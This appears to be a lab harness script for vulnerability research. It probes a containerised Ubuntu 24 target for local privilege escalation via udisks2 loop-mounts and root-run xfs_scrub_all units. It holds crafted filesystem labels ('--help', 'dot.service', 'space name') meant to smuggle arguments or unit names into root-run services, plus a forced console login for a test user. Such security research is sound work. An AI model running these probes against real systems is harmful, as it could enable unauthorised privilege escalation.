#!/usr/bin/env bash
set -euo pipefail

container="${1:-ubuntu24-server-lpe-target}"
workspace="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
log="$workspace/logs/active-udisks-xfs-scrub.out"
mkdir -p "$workspace/logs"

docker exec -i "$container" bash -s <<'EOS'
set -euo pipefail

tmp=/tmp/active-udisks-xfs-scrub
home=/home/selfauth/active-udisks-xfs-scrub
root_marker=/root/active_udisks_xfs_scrub_root
tmp_marker=/tmp/active_udisks_xfs_scrub_root

id selfauth >/dev/null 2>&1 || useradd -m -s /bin/bash selfauth
echo selfauth:selfauth | chpasswd
usermod -G selfauth selfauth

cleanup_target() {
  set +e
  loginctl terminate-user selfauth >/dev/null 2>&1 || true
  systemctl start getty@tty1.service >/dev/null 2>&1 || true
  if [ -d "$tmp" ]; then
    awk '/^loopdev=/{print $2}' "$tmp"/loops 2>/dev/null | while read -r dev; do
      [ -n "$dev" ] || continue
      udisksctl unmount -b "$dev" --no-user-interaction >/dev/null 2>&1 || umount "$dev" >/dev/null 2>&1 || true
      udisksctl loop-delete -b "$dev" --no-user-interaction >/dev/null 2>&1 || losetup -d "$dev" >/dev/null 2>&1 || true
    done
  fi
  losetup -a | awk -F: '/active-udisks-xfs-scrub/ {print $1}' | xargs -r -n1 losetup -d >/dev/null 2>&1 || true
  find /media/selfauth -maxdepth 1 -type d \( -name 'XFSOK' -o -name 'dot.service' -o -name 'space name' -o -name '--help' \) -exec umount {} \; >/dev/null 2>&1 || true
  find /media/selfauth -maxdepth 1 -type d \( -name 'XFSOK' -o -name 'dot.service' -o -name 'space name' -o -name '--help' \) -empty -delete >/dev/null 2>&1 || true
  rm -rf /run/udisks2
  rm -f /var/lib/udisks2/mounted-fs-persistent
  systemctl reset-failed 'xfs_scrub@*' xfs_scrub_all.service xfs_scrub_fail@*.service udisks2.service >/dev/null 2>&1 || true
  systemctl restart udisks2.service >/dev/null 2>&1 || true
  sleep 1
  systemctl reset-failed udisks2.service >/dev/null 2>&1 || true
  if [ -f "$tmp/created-loop-nodes" ]; then
    while read -r node; do
      [ -n "$node" ] || continue
      losetup "$node" >/dev/null 2>&1 || rm -f "$node"
    done <"$tmp/created-loop-nodes"
  fi
}
trap cleanup_target EXIT

rm -rf "$tmp" "$home" "$root_marker" "$tmp_marker"
mkdir -p "$tmp" "$home"
chmod 1777 "$tmp"
chown -R selfauth:selfauth "$home"
: >"$tmp/created-loop-nodes"
for i in $(seq 0 15); do
  node="/dev/loop$i"
  if [ ! -e "$node" ]; then
    mknod "$node" b 7 "$i"
    chmod 0660 "$node"
    chown root:disk "$node" 2>/dev/null || true
    echo "$node" >>"$tmp/created-loop-nodes"
  fi
done

{
  echo "## target"
  cat /etc/os-release | sed -n '1,8p'
  uname -a
  id attacker 2>&1 || true
  id selfauth
  echo

  echo "## docker loop-node harness accommodation"
  if [ -s "$tmp/created-loop-nodes" ]; then
    cat "$tmp/created-loop-nodes"
  else
    echo "none"
  fi
  ls -l /dev/loop[0-9]* 2>/dev/null | sed -n '1,40p'
  echo

  echo "## package versions"
  dpkg-query -W -f='${binary:Package}\t${Version}\n' xfsprogs udisks2 systemd polkitd policykit-1 2>&1 | sort
  /usr/sbin/xfs_scrub -V 2>&1 || true
  /usr/sbin/xfs_scrub_all -V 2>&1 || true
  echo

  echo "## default xfs/udisks unit state"
  systemctl is-enabled xfs_scrub_all.timer xfs_scrub_all.service xfs_scrub@.service xfs_scrub_fail@.service udisks2.service 2>&1 || true
  systemctl is-active xfs_scrub_all.timer xfs_scrub_all.service udisks2.service 2>&1 || true
  echo

  echo "## exact unit ExecStart/config paths"
  for u in xfs_scrub_all.timer xfs_scrub_all.service xfs_scrub@.service xfs_scrub_fail@.service udisks2.service; do
    echo "### $u"
    systemctl show -p FragmentPath -p UnitFileState -p ActiveState -p User -p Group -p ExecStart "$u" 2>&1 || true
    systemctl cat "$u" 2>&1 | sed -n '1,80p'
  done
  echo

  echo "## xfsprogs scrub file/config inventory"
  dpkg -L xfsprogs | grep -E 'xfs_scrub|systemd|cron|conf' | sort
  for p in /etc/xfs_scrub.conf /etc/xfs_scrub /usr/sbin/xfs_scrub /usr/sbin/xfs_scrub_all /usr/libexec/xfsprogs/xfs_scrub_fail /usr/lib/systemd/system/xfs_scrub@.service /usr/lib/systemd/system/xfs_scrub_all.service /usr/lib/systemd/system/xfs_scrub_all.timer /usr/share/xfsprogs/xfs_scrub_all.cron; do
    if [ -e "$p" ]; then
      stat -Lc '%A %U:%G %n' "$p"
    else
      echo "MISSING $p"
    fi
  done
  echo

  echo "## xfs_scrub_all implementation path"
  nl -ba /usr/sbin/xfs_scrub_all | sed -n '31,190p'
  echo

  echo "## UDisks polkit reachability"
  python3 - <<'PY'
import xml.etree.ElementTree as ET
want = {
    "org.freedesktop.udisks2.filesystem-mount",
    "org.freedesktop.udisks2.filesystem-mount-system",
    "org.freedesktop.udisks2.filesystem-mount-other-user",
    "org.freedesktop.udisks2.loop-setup",
}
root = ET.parse("/usr/share/polkit-1/actions/org.freedesktop.UDisks2.policy").getroot()
for action in root.findall("action"):
    aid = action.get("id")
    if aid not in want:
        continue
    defaults = action.find("defaults")
    vals = {}
    if defaults is not None:
        for key in ("allow_any", "allow_inactive", "allow_active"):
            elem = defaults.find(key)
            vals[key] = elem.text if elem is not None else ""
    print(f"{aid}\tallow_any={vals.get('allow_any','')}\tallow_inactive={vals.get('allow_inactive','')}\tallow_active={vals.get('allow_active','')}")
PY
} >"$tmp/root-prep.out" 2>&1

cat >"$home/probe.sh" <<'SH'
#!/bin/bash
set +e
out=/tmp/active-udisks-xfs-scrub/user.out
exec >"$out" 2>&1
id
tty
echo "XDG_SESSION_ID=$XDG_SESSION_ID"
loginctl show-session "$XDG_SESSION_ID" -p Id -p Seat -p TTY -p Active -p State -p Type -p Class -p Remote
cd /home/selfauth/active-udisks-xfs-scrub || exit 1
: >/tmp/active-udisks-xfs-scrub/loops
for label in XFSOK dot.service "space name" "--help"; do
  case "$label" in
    --help) img="dashhelp.img" ;;
    *) img="${label// /_}.img" ;;
  esac
  echo "## make xfs label=[$label] img=$img"
  truncate -s 512M -- "$img"
  /usr/sbin/mkfs.xfs -f -L "$label" "./$img"
  echo "## loop setup $img"
  loop_out="$(udisksctl loop-setup -f "$PWD/$img" --no-user-interaction 2>&1)"
  rc=$?
  echo "$loop_out"
  echo "loop_setup_rc=$rc"
  loopdev="$(printf '%s\n' "$loop_out" | awk '/ as \/dev\/loop/ {gsub(/\.$/, "", $NF); print $NF}' | tail -1)"
  [ -n "$loopdev" ] || continue
  echo "loopdev= $loopdev label=[$label]" >>/tmp/active-udisks-xfs-scrub/loops
  echo "## mount $loopdev"
  mount_out="$(udisksctl mount -b "$loopdev" --no-user-interaction 2>&1)"
  mrc=$?
  echo "$mount_out"
  echo "mount_rc=$mrc"
  mnt="$(printf '%s\n' "$mount_out" | awk '/^Mounted / {sub(/^Mounted .* at /, ""); sub(/\.$/, ""); print}' | tail -1)"
  [ -n "$mnt" ] && echo "mountpoint= $mnt label=[$label]" >>/tmp/active-udisks-xfs-scrub/loops
done
echo "## user lsblk"
lsblk --pairs --output NAME,KNAME,TYPE,FSTYPE,LABEL,UUID,MOUNTPOINT,PATH | sed -n '1,240p'
echo "## user findmnt xfs"
findmnt -rn -t xfs -o SOURCE,TARGET,FSTYPE,OPTIONS | sed -n '1,120p'
SH
chmod 0755 "$home/probe.sh"
chown -R selfauth:selfauth "$home"

cat >/home/selfauth/.bash_profile <<'SH'
/home/selfauth/active-udisks-xfs-scrub/probe.sh
exit
SH
chown selfauth:selfauth /home/selfauth/.bash_profile

systemctl stop getty@tty1.service >/dev/null 2>&1 || true
timeout 120 openvt -c 1 -s -f -w -- /bin/login -f selfauth || true
systemctl start getty@tty1.service >/dev/null 2>&1 || true
loginctl terminate-user selfauth >/dev/null 2>&1 || true
rm -f /home/selfauth/.bash_profile
udevadm settle --timeout=20 || true

{
  cat "$tmp/root-prep.out"
  echo
  echo "## active selfauth UDisks trigger"
  cat "$tmp/user.out" 2>&1 || true
  echo
  echo "## root view of mounted attacker xfs filesystems"
  cat "$tmp/loops" 2>&1 || true
  lsblk --pairs --output NAME,KNAME,TYPE,FSTYPE,LABEL,UUID,MOUNTPOINT,PATH | sed -n '1,240p'
  findmnt -rn -t xfs -o SOURCE,TARGET,FSTYPE,OPTIONS | sed -n '1,120p'
  echo

  journal_since="$(date '+%Y-%m-%d %H:%M:%S')"
  echo "## root xfs_scrub_all direct service-mode run"
  timeout 90 env SERVICE_MODE=1 /usr/sbin/xfs_scrub_all 2>&1 || true
  echo

  echo "## root xfs_scrub_all systemd service start"
  systemctl start xfs_scrub_all.service 2>&1 || true
  journalctl -S "$journal_since" -u xfs_scrub_all.service -u 'xfs_scrub@*' -u 'xfs_scrub_fail@*' --no-pager 2>&1 || true
  echo

  echo "## direct xfs_scrub@ instance starts for attacker mountpoints"
  awk '/^mountpoint=/{sub(/^mountpoint= /, ""); sub(/ label=.*/, ""); print}' "$tmp/loops" 2>/dev/null | while IFS= read -r mnt; do
    [ -n "$mnt" ] || continue
    unit="$(systemd-escape --template 'xfs_scrub@.service' --path "$mnt")"
    echo "mountpoint=$mnt"
    echo "unit=$unit"
    systemctl show -p FragmentPath -p User -p Group -p ExecStart "$unit" 2>&1 || true
    systemctl start "$unit" 2>&1 || true
    systemctl status "$unit" --no-pager 2>&1 | sed -n '1,60p' || true
  done
  echo

  echo "## root proof markers"
  ls -l "$root_marker" "$tmp_marker" 2>&1 || true
  echo

  echo "## pre-cleanup health"
  systemctl is-system-running || true
  systemctl --failed --no-legend || true
} >"$tmp/root.out" 2>&1

cleanup_target
rm -rf "$home" "$root_marker" "$tmp_marker"

{
  echo
  echo "## cleanup verification"
  losetup -a | grep active-udisks-xfs-scrub || true
  findmnt -rn -t xfs -o SOURCE,TARGET | grep active-udisks-xfs-scrub || true
  systemctl is-system-running || true
  systemctl --failed --no-legend || true
} >>"$tmp/root.out" 2>&1
exit 0
EOS

docker exec "$container" cat /tmp/active-udisks-xfs-scrub/root.out > "$log"
docker exec "$container" rm -rf /tmp/active-udisks-xfs-scrub
sed -n '1,360p' "$log"
